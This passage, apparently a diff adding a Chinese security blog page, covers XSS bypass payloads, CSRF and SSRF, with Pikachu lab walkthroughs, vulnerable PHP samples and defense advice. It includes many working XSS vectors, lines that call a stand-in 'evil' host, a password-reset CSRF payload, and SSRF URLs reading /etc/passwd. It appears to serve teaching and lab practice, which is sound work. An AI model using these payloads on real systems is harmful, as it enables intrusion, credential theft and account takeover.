+                                - data:text/html,&lt; sc r i p t&gt;alert(1)&lt;/sc r ip t&gt;
+                            - 无效的 mime-type
+                                - data:),&lt;script&gt;alert(1)&lt;/script&gt;
+                            - 小众字符集
+                        - VBS URI (IE)
+                            - vbsscript:Msgbox+1
+                    - style
+                        - font-family:a/**/ression(alert(1))('\')exp\')
+                    - HTML 编码
+                        - 实体命名编码
+                            - javascript&amp;colon;alert(1)
+                            - &amp;newLine;javascript:alert(1)
+                        - 十进制编码
+                            - java&amp;#000000000000000115;cript:loaction=name
+                        - 十六进制编码
+                            - java&amp;x000000000000000073;cript:location=name
+                - HTML
+                    - 标签优先级
+                        - {tag}&lt;img name=&quot;{/tag} onerror=alert({{i}})//&quot;&gt;
+                    - 边界检测
+                        - 反引号
+                            - alt=``onload=alert(1)
+                        - 等号
+                            - alt=
+                        - 引号
+                            - alt='&quot;name='onerror=alert()//'
+                            - style=xss:&quot;'/onclick=alert(1)//'
+                            - &lt;a href=[0x0b]&quot; onclick=alert(1)//&quot;&gt;click&lt;/a&gt;
+                        - 分隔符
+                            - alt=&quot;&quot;[newLine]onclick=alert()
+                        - 标签
+                            - &lt;! XSS=&quot;&gt;&lt;img src=xx:x onerror=alert(1)//&quot;&gt;
+                    - 魔术标签
+                        - &lt;object&gt;|&lt;embed&gt; allowScriptAccess
+                            - always
+                            - somedomain
+                                - 上传头像、上传图片、上传附件
+                                - 站内XSS转存储
+                        -SVG
+                            - &lt;svg&gt;&lt;script/xlink:href=data:,alert(1)&gt;&lt;/script&gt;
+                            - &lt;svg contentScriptType=text/vbs&gt;&lt;script&gt;MsgBox&quot;1&quot;&lt;i&gt; (IE 9)
+                            - &lt;svg&gt;&lt;script&gt;alert&amp;lpar;1&amp;rpar;&lt;/script&gt;
+                            - &lt;svg&gt;&lt;/ y=&quot;&gt;&lt;x&quot; onload=alert(1)&gt;
+                        - Math
+                            - &lt;math href=javascript:..&gt;
+                            - &lt;math&gt;&lt;a xlink:href=javascript:..&gt;
+                        - VML
+                        - Link
+                            - &lt;link rel=import href=//evil&gt;
+                            - &lt;link rel=stylesheet href=data:,*%7bx:expression(write(1))%7d
+                        - Iframe
+                            -&lt;iframe srcdoc='&amp;lt;svg/onload=alert(1)&amp;gt;'&gt;
+            - DOM
+                - document.domain 跨域
+                    - document.domain='com' (chrome 老版本)
+                - MXSS
+                    - &lt;b&gt;&lt;noscript&gt;&lt;a src='x' style='x:\3c\2fnoscript\3e\3ciframe/onload\3d alert(1)\3e'&gt; (IE11,0.0.2)
+                    - &lt;listing&gt;&amp;lt;img src=1 onerror=alert(1)&amp;gt;&lt;/listing&gt;  
+                - 原生JS
+                    - 输入
+                        - location
+                            - location.href
+                            - location.search
+                            - location.hash
+                        - window.name
+                        - document.cookie
+                        - document.referrer
+                        - postMessage
+                            - 未限制来源
+                            - 反斜线绕过判断
+                    - 触点
+                        - location
+                        - eval
+                        - innerHTML
+                        - document.write
+                        - appendChild
+                        - Function
+                        - setTimeout
+                        - setInterval     
+                - jQuery
+                    - .html(..)
+                    - .attr(..)
+                    - .append(..)
+                    - getScript(..)
+                    - .ajax
+                    - $('#...')
+                - React.js
+                    - React.createElement(..)
+                - Angular JS
+                    - &lt;b class=&quot;ng-include:'//evil'&quot;'&gt;     
+                    - &lt;iframe ng-src=javascript:..&gt; 
+            - Flash
+                - 输入
+                    - loaderInfo.parameters
+                        - 无效编码忽略机制：%Ajava%B&amp;script:alert(1)
+                        - search 解析缺陷：#?id=xx
+                    - SharedObject
+                    - LocalConnection
+                        - allowDomain(&quot;*&quot;)
+                    - HTML id attr
+                - 触点
+                    - ExternalInterface.call
+                        - arg 1: alert(1)
+                        - arg 2
+                            - \&quot;))}catch(e){alert(1)}//
+                            - split 函数缺陷
+                                - 1. ?q=%ED%A0%80\&quot;))}catch(e){alert(1)}//
+                                - 2. var q:String=loderInfo.parameters[&quot;q&quot;].split(&quot;\\&quot;).join(&quot;\\\\&quot;);
+                                - 3. ExternalInterface.call(&quot;console.log&quot;,q);
+                    - htmlText
+                        - &lt;img src=evil.swf&gt;
+                        - &lt;a href=javascript:..&gt;me&lt;/a&gt;
+                    - navigateToURL
+                    - Loader
+                    - addCallback
+            - Server
+                - String
+                    - &lt;sc&lt;script&gt;alert(1)&lt;/script&gt;
+                    - &lt;embed allowscriptaccess=&quot;alwalwaysays&quot; src=&quot;test.swf&quot;&gt;
+                    - substr
+                    - 字符集处理
+                        - gbk:%c0%22
+                        - utf32:%E2%88%80%E3%B8%80%E3%B0%80
+                - Database
+                    - 字符集
+                        - &lt;img src=&quot;http://www.baidu.com# onerror=alert(1)//{0xf09d8c86}&quot;&gt;
+                    - 数据类型
+                        - Text
+                            - &lt;a href=&quot;http://www.baidu.com# onerror=alert(1)//[64kb]&quot;&gt;&lt;/a&gt;
+                        - VARCHAR
+                            - &lt;a href=&quot;http://www.baidu.com# onclick=alert(1)//[255]&quot;&gt;&lt;/a&gt;
+                - 第三方 API
+        - 输入
+            - 邮局
+                - 附件
+                    - 预览
+                        - word字体
+                    - 标题
+                - 正文
+                - 标题
+                - 抄送人
+            - Flash 组件
+                - SwfUpload
+                - ZeroClipboard
+                - JWPlayer
+                - Open flash chart
+            - 图片 Exif
+            - 反馈
+                - 探测后台地址
+                    - `&lt;img src=//evil&gt;`                    
+                - 窃取Cookies
+                    - `&lt;/script/&lt;/textarea/'&quot;&gt;&lt;img..`
+                    - `&lt;embed src=..&gt;`
+                - 也可以是一个XSS的网址
+            - 客户端
+                - 文件传输
+                    - word字体设置
+                - 字体设置
+                - Web to Native
+                    - `&lt;img src=//evil/bind-xss&gt;`
+            - URL参数
+                - Google 搜索
+                - 流量探测
+                - Custom Spider
+            - 上传
+                - XSS.SVG
+                - XSS.XML
+                - IE: 1.jpg/xss.html
+                - IE: 1.txt
+        - 工具
+            - Charles
+                - 映射JS文件
+            - Fiddler
+                - Set cookies header
+            - Chrome DevTools
+                - 全局代码搜索
+            - Firebug-lite
+            - IE恶搞迷
+    - POC
+        - 去除 referer
+            - location='javascript:&quot;&lt;script src=//evil&gt;&lt;/script&gt;'&quot;
+            - &lt;meta name=referer content=never&gt;
+            - &lt;a href=//target rel=noreferer&gt;
+            - HTTPS + &lt;meta&gt; 跳转
+        - 长度限制
+            - 短域名
+            - &lt;svg/onload=eval(name)
+            - 多个输入点组合    &lt;script&gt;/**/
+        - 浏览器检测绕绕过
+            - Chrome
+                - &lt;link rel=import href=//evil&gt; (Chrome 39)
+                - before &lt;script&gt;:&quot;&gt;&lt;script/src=data:,alert(1)%2b&quot;
+                - in &lt;script&gt;:&lt;/script&gt;&lt;svg&gt;&lt;script&gt;alert(1)%2b%26quot;
+                - DOM   HTML HEX encode
+                - &lt;link href=&quot;origin res url&quot;&gt;
+                - &quot;&gt;&lt;script/src=data:,alert(1)%26sol;%26sol;
+            - IE
+                - &lt;a href=&quot;?q=&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;click&lt;/a&gt;
+                - &lt;script/%00%00v%00%00&gt;alert(1)&lt;/script&gt;
+                - in script         ';alert`1`
+            - 通用
+                - 多个输入点合并
+                - 复合参数组合
+                - DOM：&lt;img src=xx:x onerror=alert(1)//
+        - 突破 IE Flash document保护
+            - location='javascript:&quot;&lt;script&gt;alert(document)&lt;/script&gt;&quot;'
+        - 交互式触发
+            - 突破行级标签：display:balock;position:absollute;top:0;left:0;width:1000px;height:1000px;backgroud:red
+        - DOM hack
+            - 通过 ID Hook 变量
+                - &lt;img src=xx:x id=main&gt;
+                - &lt;form id=&quot;window&quot;&gt;&lt;input name=&quot;name&quot; value=&quot;haha&quot;&gt;
+            - 浏览器XSS拦截器
+                -  ?xss=&lt;script&gt;[page data]&lt;/script&gt;
+        - InnerHTML
+            - IE，无等号：&lt;script/defer&gt;alert(1)&lt;/script&gt;
+            - &lt;iframe/src=about:blank onload=alert(1)&gt;
+        - 跨子域
+            - document.domain=&quot;qq.com&quot;
+    - EXP
+        - 水坑
+            -&lt;iframe&gt;
+            - history.replaceState + 跳转
+        - 蠕虫
+            - 感染老数据
+        - 持久化XSS
+            - Rootkit
+                - Cookies   设置超大 max-age
+                - Flash SharedObject
+                - LocalStorage
+            - 框架化会话
+                - 无边界 iframe
+                - 地址栏同步
+                    - location.hash
+                    - history.pushState
+            - Opener 劫持
+                    - opener.eval(..exp..)
+        - 内网边界
+            - XSS-Proxy
+                - 注入至所有同源 window
+                - 本地中转代理
+            - XSS-Intranet
+                - 反弹接收系统
+                - 利用Ajax扫描内网
+                    - Struts 2:80/8080
+                        - CVE-2011-3923
+                        - CVE-2013-2251
+                        - CVE-2013-1965
+                        - CVE-2013-1966
+                        - CVE-2014-0094 (补丁绕过)
+                    - Elasticsearch:9200
+                        - CVE-2014-3120
+                        - CVE-2015-1427
+        - 本地边界
+            - 浏览器
+                - 信任域
+                - 特权域
+            - 内嵌浏览器
+                - APP
+                    - Webview
+                - Soft
+        - 反追踪
+            - 悄悄的干活
+            - 检测 referer
+            - XSS 代理服务器
+            - 清理痕迹
+                - 清理控制台：console.clear
+                - 清理地址栏：history.replaceState
+            使用 WebSocket 代替 HTTP
+            - 使用Flash封装JS
+                - navigateToURL 执行 JS 防 hook
+        - 信息收集
+            - XHR 窃取 页面数据
+            - WebRTC 获取网卡信息
+                - VPN
+                - 内网IP
+            - 获取所有链接数据
+            - 窃取Cookie重放身份
+                - 伪造X-Forword-for绕过IP限制
+                - 使用代理重放避免Cookies域问题
+        - 权限维持
+            - Keep session
+            - 钓取账户密码
+                - 1. 监听所有链接，点击触发
+                - 2. 遍历path清除Cookies
+                - 3. 多次history.pushState
+                - 4. 清空Dom：document.open
+                - 5. XHR读取写入登录页
+                - 6. 设置document.title
+                - 7. 延迟绑定窃取事件
+</code></pre>
+<h1 id="csrf">CSRF</h1>
+<blockquote>
+<p>Cross-site request forgery 简称为“CSRF”，中文名为“跨站请求伪造漏洞”，是指网站的功能存在某些缺陷，可允许攻击者预先构造请求诱导其他用户提交该请求并产生危害</p>
+</blockquote>
+<h2 id="靶场练习-2">靶场练习</h2>
+<h3 id="get型-2">GET型</h3>
+<ol>
+<li>先随便登录一个人的账号（点击提示会显示账号）</li>
+<li>我们修改信息 ，并在网络 监控文档 ---&gt; 得到一个修改信息的链接</li>
+<li>我们退出登录 ，换另外的账号进行登录 ，然后点击链接</li>
+<li>代码分析<br>
+没有验证cookie的值</li>
+</ol>
+<pre><code class="language-php">if($_GET['sex']!=null &amp;&amp; $_GET['phonenum']!=null &amp;&amp; $_GET['add']!=null &amp;&amp; $_GET['email']!=null){ 
+       //判断这些值是否为空
+     $getdata=escape($link, $_GET);
+     $query=&quot;update member set sex='{$getdata['sex']}',phonenum='{$getdata['phonenum']}',address='{$getdata['add']}',email='{$getdata['email']}' where username='{$_SESSION['csrf']['username']}'&quot;;
+     // 更新数据库中的值
+     $result=execute($link, $query);
+</code></pre>
+<h3 id="post型-2">POST型</h3>
+<ol>
+<li>与get型没什么区别 ，不过利用方式需要与xss的post利用方式类似</li>
+<li>修改个人信息，抓包</li>
+<li>生成csrf poc</li>
+<li>模拟受害者点击</li>
+</ol>
+<h4 id="token">token</h4>
+<p>Token：令牌，和Session，Cookie一样，都是身份标识，Token通常存在于URL和Cookie中，它是用于防止CSRF漏洞的。</p>
+<pre><code class="language-php">    if($_GET['sex']!=null &amp;&amp; $_GET['phonenum']!=null &amp;&amp; $_GET['add']!=null &amp;&amp; $_GET['email']!=null &amp;&amp; $_GET['token']==$_SESSION['token']){
+        // 除了基本信息意外，还校验token是否一致
+        //转义
+        $getdata=escape($link, $_GET);
+        .....
+//每次会话结束都生成新的token
+set_token();
+</code></pre>
+<h2 id="漏洞检测">漏洞检测</h2>
+<h3 id="敏感功能缺乏csrf防护机制">敏感功能缺乏csrf防护机制</h3>
+<ol>
+<li>在burpsuite中观察post请求是否带有随机Token 和 验证码</li>
+<li>再判断 去掉/修改 Referer后是否仍然可以提交成功</li>
+</ol>
+<h3 id="网站可以允许写入csrf-payload">网站可以允许写入csrf payload</h3>
+<ol>
+<li>
+<p>测试用户头像<code>&lt;img&gt;</code> / 富文本区域的<code>&lt;img&gt;</code> <code>&lt;svg&gt;</code>标签(可控)</p>
+</li>
+<li>
+<p>在头像处插入payload<br>
+<code>&lt;img src=&quot;http://www.xx.com/reset_pwd?new=123456&quot;&gt;</code></p>
+</li>
+<li>
+<p>当其他人浏览时即触发csrf攻击</p>
+</li>
+</ol>
+<h2 id="漏洞挖掘-2">漏洞挖掘</h2>
+<h3 id="常见思路-2">常见思路</h3>
+<pre><code class="language-php">- CSRF
+    - 常见漏洞点
+        - 修改密码
+        - 修改个人信息
+        - 发布文章
+        - 与账户相关的大部分业务功能点
+    - 挖掘思路
+        - 1. 是否存在token和验证码（是否可删除/可伪造）
+        - 2. 是否可以删除或伪造referer
+        - 3. &lt;img&gt;/&lt;svg&gt;等标签链接是否可控
+</code></pre>
+<h3 id="案例分析-2">案例分析</h3>
+<ol>
+<li>蠕虫</li>
+<li>账号停用
+<ol>
+<li>停用账号 抓包（没有token / 没有refer）</li>
+<li>生成csrf poc</li>
+<li>诱导其他用户点击 即停用账号</li>
+</ol>
+</li>
+<li>第三方账户绑定
+<ol>
+<li>绑定微博返回包<br>
+<code>https://www.a.test.com/users/auth/weibo/callback?state={&quot;can_transfer&quot;%3A&quot;true&quot;}&amp;code=c593bc150745c37a4d5ec05332d406af</code></li>
+<li>发给受害者</li>
+<li>微博登录受害者账号</li>
+</ol>
+</li>
+</ol>
+<h3 id="漏洞危害">漏洞危害</h3>
+<blockquote>
+<p>具体功能决定危害程度<br>
+修改性别 / 个人信息等<br>
+修改管理员密码<br>
+添加管理员<br>
+后台getshell</p>
+</blockquote>
+<h3 id="漏洞防御-2">漏洞防御</h3>
+<ol>
+<li>在铭感请求提交表单中加入随机的Token或者验证码，防止攻击者预测</li>
+<li>合理校验请求Referer ，判断请求是否来自本站或者其他授权的域名；防御可写入csrf pyaload 攻击 ，禁止用户自定义任何标签的链接属性</li>
+</ol>
+<h3 id="靶场练习-3">靶场练习</h3>
+<!-- more -->
+<h1 id="ssrf">SSRF</h1>
+<blockquote>
+<p>SSRF(Server-Side Request Forgery:服务器端请求伪造)，一般情况下ssrf攻击的目标时从外网无法访问的内部系统，简单来说就是让服务器替攻击者发请求</p>
+</blockquote>
+<h2 id="靶场练习-4">靶场练习</h2>
+<h3 id="curl_exec">curl_exec</h3>
+<ol>
+<li>请求www.baidu.com判断有无ssrf漏洞<br>
+<code>http://192.168.142.53/pikachu/vul/ssrf/ssrf_curl.php?url=http://www.baidu.com</code></li>
+<li>dict协议探测内网端口<br>
+<code>http://192.168.142.53/pikachu/vul/ssrf/ssrf_curl.php?url=dict://127.0.0.1</code></li>
+<li>file协议读取内网文件<br>
+<code>http://192.168.142.53/pikachu/vul/ssrf/ssrf_curl.php?url=file:///etc/passwd</code></li>
+<li>gopher协议实现post请求<br>
+<code>URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;</code>_(后接TCP数据流)</li>
+</ol>
+<blockquote>
+<p>1、构造HTTP数据包<br>
+2、URL编码、替换回车换行为%0d%0a<br>
+3、发送gopher协议</p>
+</blockquote>
+<blockquote>
+<p>1、问号（？）需要转码为URL编码，也就是%3f<br>
+2、回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a<br>
+3、在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）</p>
+</blockquote>
+<ol start="5">
+<li>代码分析</li>
+</ol>
+<p><strong>危险函数</strong><br>
+<mark>curl_exec</mark><br>
+<code>curl_exec(CurlHandle $handle): string | bool</code></p>
+<blockquote>
+<p>执行指定curl会话<br>
+这个函数应该在初始化curl会话并且设置所有选项后调用</p>
+</blockquote>
+<pre><code class="language-php">if(isset($_GET['url']) &amp;&amp; $_GET['url'] != null){
+
+    //接收前端URL没问题,但是要做好过滤,如果不做过滤,就会导致SSRF
+    $URL = $_GET['url'];
+    $CH = curl_init($URL);
+    curl_setopt($CH, CURLOPT_HEADER, FALSE);
+    curl_setopt($CH, CURLOPT_SSL_VERIFYPEER, FALSE);
+    $RES = curl_exec($CH);
+    curl_close($CH) ;
+//ssrf的问是:前端传进来的url被后台使用curl_exec()进行了请求,然后将请求的结果又返回给了前端。
+//除了http/https外,curl还支持一些其他的协议curl --version 可以查看其支持的协议,telnet
+//curl支持很多协议，有FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE以及LDAP
+    echo $RES;
+}
+</code></pre>
+<p><mark>file_get_content</mark><br>
+file_get_contents 将整个文件读入到一个字符串中<br>
+和file()一样，只除了file_get_contents()把文件读入到一个字符串中，将在参数offset指定的位置开始读取长度为length的内容。如果失败，file_get_contents()将返回false</p>
+<pre><code class="language-php">file_get_contents(
+    string $filename,
+    bool $use_include_path = false,
+    ?resource $context = null,
+    int $offset = 0,
+    ?int $length = null
+): string | false
+</code></pre>
+<h2 id="ssrf漏洞挖掘">SSRF漏洞挖掘</h2>
+<h3 id="常见思路-3">常见思路</h3>
+<pre><code class="language-php">- SSRF
+    - 常见漏洞点
+        - 对外网发起请求的地方（图片抓取/翻译网页/网页分享等）
+        - 从远程服务请求资源的地方（url上传/导入文件/rss订阅等）
+        - 文件处理、编码处理、属性信息处理（FFmpeg转码/xml等）
+        - 数据库可加载外部url（oracle，mongodb，mssql，postgresql，couchdb）
+        - webmail收取其他邮箱邮件（pop3 imap smtp等）
+    - 限制
+        - Openssl
+        - 鉴权（cookie/http basic认证等）
+        - 校验其他头部字段
+    - 回显分类
+        - 有回显
+            - http://www.baidu.com
+            - http://127.0.0.1/127.0.0.2
+            - file:///
+            - dict://
+        - 半盲回显（半盲ssrf）
+            - 收不到返回内容，但可以看到请求成功或失败的提示信息
+            - 特定情况下，可以收到特定格式或特定响应头的返回内容
+        - 无回显（全盲ssrf）
+            - Dnslog
+            - Httplog
+</code></pre>
+<h3 id="案例分析-3">案例分析</h3>
+<p><strong>网页翻译</strong><br>
+在Google翻译中找到网页翻译，输入网址</p>
+<p><strong>奇奇怪怪的挖掘</strong></p>
+<ol>
+<li>正常访问 /</li>
+<li>将/ 改为我们的主机地址</li>
+<li>其他地址验证</li>
+</ol>
+<h3 id="工具-2">工具</h3>
+<p><strong>autorepeater</strong></p>
+<ol>
+<li>准备</li>
+</ol>
+<ul>
+<li>autorepeater</li>
+<li>ceye.io ( dnslog / http 平台)</li>
+<li>正则表达式</li>
+</ul>
+<blockquote>
+<p><code>(?i)^(https|http|file)://.*  </code>  保证未编码的 URL 可以被正常匹配<br>
+<code>(?i)^(https|http|file)%3A%2F%2F.*  </code> 保证编码的 URL 可以被正常匹配到</p>
+</blockquote>
+<ol start="2">
+<li>如下配置</li>
+</ol>
+<blockquote>
+<p>然后配置如下规则:<br>
+正则的作用就是匹配 URL 然后替换成 DNSLOG 的地址,接着自动发包<br>
+然后在有空的时候去看看 DNSLOG 有没有数据或是把所有带 URL 的自己测试一遍就知道有没有 ssrf</p>
+</blockquote>
+<ol start="3">
+<li>测试</li>
+</ol>
+<h3 id="漏洞危害-2">漏洞危害</h3>
+<blockquote>
+<ol>
+<li>扫描内部网络，获取网络结构以及内网机器指纹(FingerPrint)</li>
+<li>向内部任意主机的任意端口发送精心构造的数据包(Payload)</li>
+<li>通过请求大文件，保持keep-alive 发起拒绝服务攻击(DoS)</li>
+<li>枚举爆破用户名，目录 文件等（Brute Force）</li>
+</ol>
+</blockquote>
+<h3 id="漏洞防御-3">漏洞防御</h3>
+<blockquote>
+<p>1.尽量避免使用服务器根据用户参数远程加载资源<br>
+2. 尽量将资源固定化，避免用户提交可变参数<br>
+3. 对使用的开源库的ssrf漏洞进行了解<br>
+4. 鉴权</p>
+</blockquote>
+<p><strong>靶场练习</strong>（熟悉dict / file / gopher协议）</p>
+<ol>
+<li>vulhub靶场练习<br>
+<code>https://vulhub.org/#/environments/weblogic/ssrf/</code></li>
+<li>感兴趣可以了解ssrf攻击</li>
+<li>redis未授权服务 <code>https://xz.aliyun.com/t/4051</code></li>
+<li>攻击 kubernetes服务 <code>https://cloud.tencent.com/developer/article/1893363</code></li>
+</ol>
+
+            </div>
+            <hr style="width: 80%;">
+            
+            <div class="postfooter">
+                <ul class="post-copyright">
+                    <li><strong>文章作者：</strong>Moyv_xmoct</li>
+            <li><strong>原文链接：</strong>https://xmoct.github.io/post/kua-zhan-jiao-ben-gong-ji/</li>
+            <li><strong>版权声明：</strong>本博客所有文章除特别声明外，均采用<i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA
+                许可协议。转载请注明出处！</li>
+            </ul>
+        </div>
+        
+        <div id="otherpost">
+            
+            <a  data-pjax class="prev-post-pc" href="https://xmoct.github.io/post/9wK7KUt6d/"  style="color: black;">
+                <div id="ppcontainer">
+                    
+                    <img src="https://xmoct.github.io/post-images/9wK7KUt6d.png" style="width: 100%;" class="opimg">
+                    
+                    <h4 class="optitle">文件上传和文件包含</h4>
+                </div>
+            </a>
+            <div class="prev-post">
+                上一篇 <a  data-pjax href="https://xmoct.github.io/post/9wK7KUt6d/">文件上传和文件包含</a>
+            </div>
+            
+            
+            <a data-pjax class="next-post-pc" href="https://xmoct.github.io/post/cbian-cheng-2/"  style="color: black;">
+                <div id="npcontainer">
+                    
+                    
+                    <img src="" style="width: 100%;" class="opimg">
+                    
+                    
+                    <h4 class="optitle">C++编程2</h4>
+                </div>
+            </a>
+            <div class="next-post">
+                下一篇 <a  data-pjax href="https://xmoct.github.io/post/cbian-cheng-2/">C++编程2</a>
+            </div>
+            
+        </div>
+    </div>
+    </div>
+    </div>
+    <!-- 弹窗 -->
+    <div id="myModal" class="modal">
+        <img class="modal-content" id="img01">
+    </div>
+</body>
+<script>
+    //文章阅读热度
+    var pl = $("#pl").html();
+    var rootaddr = $("#rootaddr").html();
+    pl = pl.replace(rootaddr, "");
+    $("#hotnum").attr('id', pl);
+</script>
+                    <div class="toc-container">
+                        <ul class="markdownIt-TOC">
+<li><a href="#xss">XSS</a>
+<ul>
+<li><a href="#%E7%AE%80%E8%BF%B0">简述</a></li>
+</ul>
+</li>
+<li><a href="#%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0">靶场练习</a>
+<ul>
+<li><a href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss">反射型xss</a>
+<ul>
+<li><a href="#get%E5%9E%8B">GET型</a></li>
+<li><a href="#post%E5%9E%8B">POST型</a></li>
+<li><a href="#%E5%AD%98%E5%82%A8%E5%9E%8Bxss">存储型xss</a></li>
+<li><a href="#dom%E5%9E%8Bxss">DOM型xss</a></li>
+</ul>
+</li>
+<li><a href="#xss%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B">Xss漏洞检测</a>
+<ul>
+<li><a href="#%E5%8F%8D%E5%B0%84%E5%9E%8B">反射型</a></li>
+<li><a href="#%E5%AD%98%E5%82%A8%E5%9E%8B">存储型</a></li>
+<li><a href="#dom%E5%9E%8B">DOM型</a></li>
+</ul>
+</li>
+<li><a href="#xss%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F">Xss的绕过方式</a>
+<ul>
+<li><a href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87">双写绕过</a></li>
+<li><a href="#%E7%BC%96%E7%A0%81%E8%BD%AC%E4%B9%89">编码转义</a></li>
+<li><a href="#%E5%AE%9E%E4%BD%93%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87">实体编码绕过</a></li>
+<li><a href="#%E5%B9%B3%E6%9B%BF%E7%AC%A6%E5%8F%B7%E7%BB%95%E8%BF%87">平替符号绕过</a></li>
+<li><a href="#%E7%AC%A6%E5%8F%B7%E8%A2%AB%E7%BC%96%E7%A0%81">符号被编码</a></li>
+<li><a href="#%E5%85%B6%E4%BB%96%E9%9D%9E%E9%BB%91%E5%90%8D%E5%8D%95%E5%8F%AF%E7%94%A8%E6%A0%87%E7%AD%BE">其他非黑名单可用标签</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98">漏洞挖掘</a>
+<ul>
+<li><a href="#%E5%B8%B8%E8%A7%81%E6%80%9D%E8%B7%AF">常见思路</a></li>
+<li><a href="#%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90">案例分析</a>
+<ul>
+<li><a href="#url%E4%B8%AD%E7%9A%84xss">url中的xss</a></li>
+<li><a href="#%E7%95%99%E8%A8%80%E5%A4%84">留言处</a></li>
+<li><a href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">文件上传</a></li>
+</ul>
+</li>
+<li><a href="#icloud-drive">icloud Drive</a></li>
+<li><a href="#%E7%94%A8%E6%88%B7%E6%B3%A8%E5%86%8C">用户注册</a>
+<ul>
+<li><a href="#%E5%8D%B1%E5%AE%B3"><strong>危害</strong></a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1">漏洞防御</a></li>
+<li><a href="#xss%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88">xss修复方案</a></li>
+<li><a href="#%E5%B7%A5%E5%85%B7">工具</a></li>
+<li><a href="#%E4%BB%BB%E5%8A%A1">任务</a></li>
+</ul>
+</li>
+<li><a href="#xss%E8%84%91%E5%9B%BE">xss脑图</a></li>
+</ul>
+</li>
+<li><a href="#csrf">CSRF</a>
+<ul>
+<li><a href="#%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-2">靶场练习</a>
+<ul>
+<li><a href="#get%E5%9E%8B-2">GET型</a></li>
+<li><a href="#post%E5%9E%8B-2">POST型</a>
+<ul>
+<li><a href="#token">token</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B">漏洞检测</a>
+<ul>
+<li><a href="#%E6%95%8F%E6%84%9F%E5%8A%9F%E8%83%BD%E7%BC%BA%E4%B9%8Fcsrf%E9%98%B2%E6%8A%A4%E6%9C%BA%E5%88%B6">敏感功能缺乏csrf防护机制</a></li>
+<li><a href="#%E7%BD%91%E7%AB%99%E5%8F%AF%E4%BB%A5%E5%85%81%E8%AE%B8%E5%86%99%E5%85%A5csrf-payload">网站可以允许写入csrf payload</a></li>
+</ul>
+</li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-2">漏洞挖掘</a>
+<ul>
+<li><a href="#%E5%B8%B8%E8%A7%81%E6%80%9D%E8%B7%AF-2">常见思路</a></li>
+<li><a href="#%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90-2">案例分析</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3">漏洞危害</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1-2">漏洞防御</a></li>
+<li><a href="#%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-3">靶场练习</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#ssrf">SSRF</a>
+<ul>
+<li><a href="#%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-4">靶场练习</a>
+<ul>
+<li><a href="#curl_exec">curl_exec</a></li>
+</ul>
+</li>
+<li><a href="#ssrf%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98">SSRF漏洞挖掘</a>
+<ul>
+<li><a href="#%E5%B8%B8%E8%A7%81%E6%80%9D%E8%B7%AF-3">常见思路</a></li>
+<li><a href="#%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90-3">案例分析</a></li>
+<li><a href="#%E5%B7%A5%E5%85%B7-2">工具</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3-2">漏洞危害</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1-3">漏洞防御</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+                    </div>
+                    <div class="tog">
+                        <div class="toggleContainer">
+                            <div class="toggle">
+                                <i class="fas fa-angle-double-up"></i>
+                            </div>
+                        </div>
+                    </div>
+                    <!---------------------------- 评论系统👇 ------------------------->
+                    <div id="comment" class="comment">
+                        <div class="commentcontainer">
+                            
+                                
+                            
+                        </div>
+                    </div>
+                    <!---------------------------- 评论系统👆 ------------------------->
+                </div>
+                <!-- main标签，pjax渲染时加载以上内容👆 -->
+                <div class="col-md-1 col-lg-2"></div>
+                <div id="bg">
+                </div>
+            </div>
+            <!-- ----------------左侧菜单栏html 👆-------------------------------------->
+            
+        </div>
+        <!-- aplayer播放器加载👇 -->
+            
+        <!-- aplayer播放器加载👆 -->
+    </div>
+    <!-- 背景图加载方式👇 -->
+    <div id="bgchoice" style="display: none">link
+                </div>
+                
+                <div id="bgurl" style="display:none"></div>
+                
+    <!-- 背景图加载方式👆 -->
+</body>
+
+<script>
+    //初始化
+    //更换twikoo头像
+    setTimeout(replaceAvatar,1000);
+    setTimeout(replaceAvatar,2000);
+    setTimeout(replaceAvatar,8000);
+    // --------为每张图片添加懒加载（lazyload）标签-->懒加载功能 👇------------
+    lazyload();
+    //为文章内所有代码块添加代码复制功能 👇
+    codeinit();
+    // ------代码高亮显示功能-------------
+    hljs.initHighlightingOnLoad();
+    if (shareChoice)
+        shareInit();
+    if (donateChoice)
+        donateInit();
+</script>
+
+<!------------------ 加载live2d模型功能（看板娘）👇 ---------------->
+
+<script type="text/javascript">
+    var message_Path = '/live2d/'
+    var home_Path = document.getElementById("domainname").innerHTML + "/"; //此处修改为你的域名，必须带斜杠
+</script>
